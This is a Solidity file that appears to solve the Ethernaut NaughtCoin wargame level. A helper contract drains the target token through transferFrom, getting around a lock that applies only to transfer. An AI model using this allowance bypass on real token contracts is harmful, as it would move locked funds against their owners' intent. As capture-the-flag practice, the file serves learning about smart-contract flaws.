// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

interface INaughtCoin {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
contract Cracked15_NaughtCoin {
    address ethernaut_contracts;

    constructor(address _address) {
        ethernaut_contracts = _address;
    }

    function transfer(uint256 amount) public returns (bool) {
        return INaughtCoin(ethernaut_contracts).transferFrom(msg.sender, address(this), amount);
    }
}
